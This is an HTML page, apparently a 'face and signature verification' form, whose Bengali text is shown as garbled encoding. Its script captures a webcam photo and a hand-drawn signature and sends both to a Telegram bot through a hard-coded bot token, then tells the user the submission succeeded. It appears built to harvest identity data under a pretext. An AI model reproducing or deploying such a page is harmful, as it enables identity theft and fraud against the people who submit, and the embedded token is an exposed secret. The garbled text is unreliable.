<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <title>ржлрзЗрж╕ ржУ рж╕рзНржмрж╛ржХрзНрж╖рж░ ржнрзЗрж░рж┐ржлрж┐ржХрзЗрж╢ржи</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 20px; }
    video, canvas { width: 90%; max-width: 320px; margin-bottom: 15px; border: 1px solid #ccc; }
    .signature { border: 1px dashed #000; height: 150px; }
    button { padding: 10px 20px; margin: 10px; background: green; color: #fff; border: none; border-radius: 6px; }
  </style>
</head>
<body>
  <h2>ржлрзЗрж╕ ржУ рж╕рж┐ржЧржирзЗржЪрж╛рж░ ржпрж╛ржЪрж╛ржЗ</h2>
  
  <video id="video" autoplay></video>
  <canvas id="faceCanvas" width="320" height="240" style="display:none;"></canvas>

  <h3>тЬНя╕П рж╕рзНржмрж╛ржХрзНрж╖рж░ ржХрж░рзБржи</h3>
  <canvas id="signCanvas" class="signature" width="320" height="150"></canvas><br/>

  <button id="capture">ЁЯУ╕ ржлрзЗрж╕ ржХрзНржпрж╛ржкржЪрж╛рж░</button>
  <button id="submit">тЬЕ рж╕рж╛ржмржорж┐ржЯ ржХрж░рзБржи</button>

  <p id="result"></p>

  <script>
    const video = document.getElementById('video');
    const faceCanvas = document.getElementById('faceCanvas');
    const faceCtx = faceCanvas.getContext('2d');
    const signCanvas = document.getElementById('signCanvas');
    const signCtx = signCanvas.getContext('2d');
    const result = document.getElementById('result');

    let faceImage = "";
    let drawing = false;

    // ржХрзНржпрж╛ржорзЗрж░рж╛ ржЪрж╛рж▓рзБ
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => alert("ржХрзНржпрж╛ржорзЗрж░рж╛ ржЪрж╛рж▓рзБ ржХрж░рж╛ ржпрж╛ржЪрзНржЫрзЗ ржирж╛: " + err));

    // рж╕рзНржмрж╛ржХрзНрж╖рж░ ржЖржБржХрж╛
    signCanvas.addEventListener('mousedown', () => drawing = true);
    signCanvas.addEventListener('mouseup', () => drawing = false);
    signCanvas.addEventListener('mousemove', e => draw(e));
    signCanvas.addEventListener('touchstart', e => { drawing = true; draw(e.touches[0]); });
    signCanvas.addEventListener('touchend', () => drawing = false);
    signCanvas.addEventListener('touchmove', e => { draw(e.touches[0]); e.preventDefault(); });

    function draw(e) {
      if (!drawing) return;
      const rect = signCanvas.getBoundingClientRect();
      signCtx.lineWidth = 2;
      signCtx.strokeStyle = "black";
      signCtx.lineTo(e.clientX - rect.left, e.clientY - rect.top);
      signCtx.stroke();
      signCtx.beginPath();
      signCtx.moveTo(e.clientX - rect.left, e.clientY - rect.top);
    }

    // ржлрзЗрж╕ ржХрзНржпрж╛ржкржЪрж╛рж░
    document.getElementById('capture').onclick = () => {
      faceCtx.drawImage(video, 0, 0, faceCanvas.width, faceCanvas.height);
      faceImage = faceCanvas.toDataURL("image/jpeg");
      result.innerText = "тЬЕ ржлрзЗрж╕ ржХрзНржпрж╛ржкржЪрж╛рж░ рж╕ржорзНржкржирзНржи рж╣рзЯрзЗржЫрзЗ!";
    };

    // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо ржмржЯ ржП ржкрж╛ржарж╛ржирзЛ
    document.getElementById('submit').onclick = async () => {
      if (!faceImage) return alert("тЪая╕П ржлрзЗрж╕ ржХрзНржпрж╛ржкржЪрж╛рж░ ржХрж░рзЗржиржирж┐!");
      const signImage = signCanvas.toDataURL("image/png");

      const botToken = "7075083128:AAGNo5wBZ3Y7B7Lexp5U4_-XuO-kxQVYeQY";
      const chatId = "YOUR_CHAT_ID"; // ржПржЦрж╛ржирзЗ ржЖржкржирж╛рж░ ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо ржЪрзНржпрж╛ржЯ ржЖржЗржбрж┐ ржмрж╕рж╛ржи

      result.innerText = "ЁЯУд ржбрзЗржЯрж╛ ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ...";

      // ржлрзЗрж╕ ржЫржмрж┐ ржкрж╛ржарж╛ржирзЛ
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: new URLSearchParams({
          chat_id: chatId,
          photo: faceImage,
          caption: "тЬЕ ржлрзЗрж╕ ржнрзЗрж░рж┐ржлрж┐ржХрзЗрж╢ржи ржЫржмрж┐"
        })
      });

      // рж╕рж┐ржЧржирзЗржЪрж╛рж░ ржкрж╛ржарж╛ржирзЛ
      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: new URLSearchParams({
          chat_id: chatId,
          photo: signImage,
          caption: "ЁЯЦКя╕П рж╕рзНржмрж╛ржХрзНрж╖рж░"
        })
      });

      result.innerText = "тЬЕ ржЖржкржирж╛рж░ ржлрзЗрж╕ ржУ рж╕рзНржмрж╛ржХрзНрж╖рж░ рж╕ржлрж▓ржнрж╛ржмрзЗ ржкрж╛ржарж╛ржирзЛ рж╣рзЯрзЗржЫрзЗ!";
    };
  </script>
</body>
</html>
